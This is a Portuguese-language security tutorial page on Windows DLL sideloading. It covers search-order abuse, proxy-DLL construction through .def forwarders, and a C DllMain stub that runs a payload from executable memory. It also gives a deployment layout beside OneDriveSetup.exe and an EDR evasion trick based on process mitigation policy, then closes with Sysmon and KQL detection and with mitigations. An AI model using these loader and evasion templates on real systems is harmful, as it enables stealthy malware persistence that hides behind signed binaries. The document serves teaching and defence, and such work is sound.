---
layout: cyber
section: evasao
title: "DLL Sideloading"
---

# 15. DLL Sideloading

## Binário Assinado Como Veículo

Sideloading abusa o DLL search order do Windows pra fazer um binário **legítimo e assinado** carregar uma DLL maliciosa. O resultado é poderoso por quatro razões: processo aparenta ser ferramenta confiável (vmware-, java-, OneDrive-), DLL maliciosa executa no contexto do binário assinado, AV confia no binário pai e reduz scrutinia, e application whitelisting é bypassado (binário é Microsoft ou vendor-signed). APTs clássicas dependem disso pra persistência stealthy — PlugX, Mustang Panda, Winnti todos usam.

---

## A Ordem de Busca de DLL

### DLL Search Order (Windows, com SafeDllSearchMode habilitado)

Quando processo chama `LoadLibrary("foo.dll")` sem path absoluto, Windows procura em ordem:

1. Diretório do executável (`C:\Program Files\App\` se app rodou daí).
2. `C:\Windows\System32\`.
3. `C:\Windows\System\`.
4. `C:\Windows\`.
5. Current directory.
6. `%PATH%`.

**Sideloading explora #1**: se DLL legítima carregada por nome relativo existe em System32 mas atacante coloca DLL homônima no diretório do executável → executável carrega a maliciosa primeiro.

### Pré-requisitos

- Binário alvo deve carregar DLL via nome relativo (sem path absoluto).
- Binário não usar `LOAD_LIBRARY_SEARCH_SYSTEM32` flag (que força System32).
- Binário deve ter permissão para gravar no diretório (sideload em `Program Files` precisa de admin).

### Variantes

| Técnica | Mecânica |
|---------|---------|
| **DLL Sideloading** | DLL homônima no path do binário (mais comum) |
| **DLL Search Order Hijacking** | DLL em diretório que aparece **antes** do real em search order |
| **DLL Proxying** | DLL maliciosa exporta todas APIs da original via forwarders + injeta payload |
| **Phantom DLL** | Binário tenta carregar DLL que **não existe** (ex: `wlbsctrl.dll` para IKEEXT). Atacante cria. |

---

## Na Prática

### 1. Identificar Binário Vulnerável

Ferramentas:
- **ProcMon** (Sysinternals): filtrar Operation = "CreateFile" + Result = "NAME NOT FOUND" + Path *.dll = candidatos para Phantom DLL hijacking.
- **rcedit / sigthief**: confirmar binário assinado.
- **HijackLibs.net**: database de binários conhecidos vulneráveis (OneDriveSetup.exe, vmware-version.exe, etc.).

Exemplo clássico: `OneDriveSetup.exe` carrega `version.dll` por nome → sideloadable.

### 2. Construir Proxy DLL

Para que binário continue funcionando, DLL maliciosa precisa exportar mesmas funções que original. Duas opções:

#### A) Forwarders (.def file)

Lista cada export e redireciona para DLL original.

```
; payload.def
LIBRARY payload
EXPORTS
    GetFileVersionInfoA = version_orig.GetFileVersionInfoA
    GetFileVersionInfoSizeA = version_orig.GetFileVersionInfoSizeA
    VerQueryValueA = version_orig.VerQueryValueA
    ; ... copiar todos exports da version.dll original
```

Renomear original para `version_orig.dll` e compilar nossa DLL como `version.dll`.

#### B) Manual Proxy (mais flexível)

DLL maliciosa carrega original manualmente e resolve exports.

```c
#include <windows.h>

HMODULE hOrig = NULL;

BOOL APIENTRY DllMain(HMODULE hMod, DWORD reason, LPVOID lpResv) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hMod);

        // Carregar DLL original (renomeada)
        hOrig = LoadLibraryA("C:\\Windows\\System32\\version.dll");

        // Disparar payload em thread separada para não bloquear DllMain
        CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
    }
    return TRUE;
}

// Proxy de uma export
__declspec(naked) void GetFileVersionInfoA() {
    __asm {
        jmp [hOrig + GetFileVersionInfoA_offset]
        ; ou via GetProcAddress runtime
    }
}
```

### 3. Geração Automatizada — Spartacus / Koppeling

**Spartacus** (Accenture) e **Koppeling** (Adam Chester) automatizam:
- Identificam exports da DLL original.
- Geram `.def` file com forwarders.
- Stub C com `DllMain` + payload thread.
- Compilam.

```bash
# Spartacus exemplo (busca + gen)
Spartacus.exe --mode dll --pml C:\Logs\procmon.pml --csv hijack.csv --solution out\
```

### 4. Payload em DllMain

⚠️ **Evitar trabalho pesado em `DllMain`** (loader lock). Sempre disparar thread:

```c
DWORD WINAPI PayloadThread(LPVOID lpParam) {
    // Aqui pode chamar LoadLibrary, CreateProcess, etc.
    LPVOID pAlloc = VirtualAlloc(NULL, sizeof(Payload),
                                  MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(pAlloc, Payload, sizeof(Payload));
    ((void(*)())pAlloc)();
    return 0;
}
```

### 5. Deployment

```
C:\Users\Public\AppDir\
├── OneDriveSetup.exe       (legítimo, assinado MS)
├── version.dll             (maliciosa)
└── version_orig.dll        (cópia da real, renomeada)
```

Ao executar `OneDriveSetup.exe`, `version.dll` malicioso é carregado → DllMain dispara payload thread → forwarders mantêm app funcional.

---

## EDR-Evasion Specific

### Por que sideloading bypassa EDR userland hooks

EDR injeta DLLs hook em **todo** processo (via AppInit_DLLs, image load callback, etc.). Mas:

1. **Binário assinado é "trusted"**: EDR pode skip hook ou aplicar policy mais permissiva.
2. **Block Non-Microsoft Binaries (BLOCK_NON_MS) policy**: child de processo com essa policy ativa **não carrega DLLs EDR** (que não são Microsoft signed).
3. **Image baseline mismatch**: EDR detecta DLL não-assinada em processo, mas DLL pode ser assinada via stolen cert ou self-signed cert no trust store comprometido.

### Sideloading + Block DLL Policy Combo

```c
// Parent process (atacante) cria child com mitigation
PROCESS_CREATION_MITIGATION_POLICY mitigation =
    PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

UpdateProcThreadAttribute(
    si.lpAttributeList, 0,
    PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
    &mitigation, sizeof(mitigation), NULL, NULL);

// Child process tenta carregar EDR.dll → BLOCKED pela mitigation
// Mas precisa carregar minha version.dll, que tem que ser Microsoft-signed
// (ou EnableNonMicrosoftBinaries flag negativa)
```

Real-world: alguns vendors atacantes usam **stolen Microsoft EV signing certs**, permitindo bypass completo.

---

## Detecção

### Static

- DLL não-assinada em diretório de aplicação assinada.
- Hash mismatch entre DLL no path do binário e DLL System32 homônima.
- Module loaded from non-standard path (Sysmon Event 7).

### Dynamic

- Sysmon Event 7 (Image Loaded) com `Signature != Microsoft` em processo assinado MS.
- Image Load com path inusitado para DLL conhecida (`version.dll` carregando de `C:\Users\` em vez de `System32`).
- Sequência: process create + image load DLL random + spawn cmd.exe = chain alerta.

### Hunting Queries

```sql
-- KQL Defender ATP
DeviceImageLoadEvents
| where FolderPath !startswith "C:\\Windows\\"
| where FileName in~ ("version.dll", "winmm.dll", "uxtheme.dll", "secur32.dll", "wlbsctrl.dll")
| where InitiatingProcessSignatureStatus == "Signed"
| where SignatureStatus != "Signed"
```

## Mitigações Defensivas

- Habilitar `SafeDllSearchMode` (padrão Windows moderno).
- Aplicações usarem `LOAD_LIBRARY_SEARCH_SYSTEM32` em todos `LoadLibrary` calls.
- WDAC com publisher policy (restringir DLLs por signature do publisher).
- Monitor DLLs unsigned em paths não-System32 carregando em processos signed.

## Leitura Complementar

- HijackLibs.net — catálogo de targets pra sideloading — https://hijacklibs.net/
- Spartacus (Accenture)
- Koppeling — Adam Chester / @_xpn_
- MITRE ATT&CK T1574.002 — DLL Side-Loading
